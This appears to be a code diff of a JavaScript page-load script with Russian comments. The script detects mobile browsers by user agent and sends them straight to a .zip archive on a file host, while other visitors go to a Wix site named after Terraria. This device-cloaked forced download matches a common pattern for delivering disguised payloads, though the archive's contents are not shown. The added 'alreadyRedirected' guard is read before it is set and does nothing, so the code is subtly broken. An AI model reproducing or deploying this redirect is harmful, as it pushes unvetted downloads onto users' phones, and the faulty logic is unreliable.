@@ -1,17 +1,11 @@
-
-
-
-
-
-    <script>
-      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-        window.location = "https://78dc96d8-907c-46b6-91e2-7219ba75fc46.usrfiles.com/archives/78dc96_d477a92e90ae4f7e9f66e9f1f09cab92.zip";
-      } else {
-        window.location = "https://terraria503555.wixsite.com/website-11";
-      }
-    </script>
-
-
-
-
-
+if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+  if (!alreadyRedirected) {
+    // выполнить редирект на архив для мобильных устройств
+    window.location = "https://78dc96d8-907c-46b6-91e2-7219ba75fc46.usrfiles.com/archives/78dc96_d477a92e90ae4f7e9f66e9f1f09cab92.zip";
+  }
+} else {
+  // выполнить редирект на основной сайт
+  window.location = "https://terraria503555.wixsite.com/website-11";
+}
+// пометить флаг, что уже был выполнен редирект
+var alreadyRedirected = true;
